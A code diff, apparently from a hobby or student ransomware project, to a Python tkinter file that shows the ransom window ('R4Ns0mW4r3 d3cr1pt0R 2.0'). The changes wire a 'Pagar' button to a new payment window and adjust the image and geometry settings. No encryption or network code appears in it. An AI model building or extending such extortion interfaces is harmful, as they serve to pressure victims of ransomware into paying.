@@ -1,7 +1,7 @@
 #Programa que muestra la ventana de rescate.
 
 #Paquete de otra carpeta.
-import images
+import images,payWindow
 
 #Librería para los elementos de la GUI.
 import tkinter as tk  	
@@ -18,7 +18,7 @@ class rescueWindow(object):
         self.Ventana.title("R4Ns0mW4r3 d3cr1pt0R 2.0")	#Título de la ventana.
         #self.Ventana.overrideredirect(1) #Esconde la barra superior.
         self.Ventana.attributes('-toolwindow', True) #No permite modificar atributos de la ventana.
-        self.Ventana.geometry("1000x568+500+250")	#Tamaño de la ventana.
+        self.Ventana.geometry("1000x568")	#Tamaño de la ventana.
 
         #Configuración de renglones y columnas.
         self.Ventana.columnconfigure(1, weight=1)
@@ -27,13 +27,13 @@ class rescueWindow(object):
         self.Ventana.rowconfigure(5, pad=7)
 
         #Imagen de fondo
-        img = tk.PhotoImage(file="images/fondo.png")
+        img = tk.PhotoImage(master=self.Ventana,file="images/fondo.png")
         label = tk.Label(self.Ventana,image=img)
         label.place(x=0, y=0)
 
 
         #Imagen de craneo
-        imgCran = tk.PhotoImage(file="images/craneo.png")
+        imgCran = tk.PhotoImage(master=self.Ventana,file="images/craneo.png")
         labelCran = tk.Label(self.Ventana,
                             image=imgCran,
                             bg="#fff",
@@ -111,8 +111,13 @@ Date prisa! :v, porque el tiempo corre y el juego acaba de comenzar."""
                             width = 25,
                             bg = "black",
                             fg = "yellow",
-                            font = "Verdana 12 bold")
+                            font = "Verdana 12 bold",
+                            command=self.newWindow)
         btnPagar.grid(row = 4, column = 2)
         
         self.Ventana.wm_attributes("-transparentcolor", 'white') #Línea para dar transparencia.
         self.Ventana.mainloop()		#Muestra la ventana.
+
+    def newWindow(self):
+        nuevaVentana = tk.Toplevel(self.Ventana)
+        payWindow.payWindow(nuevaVentana)
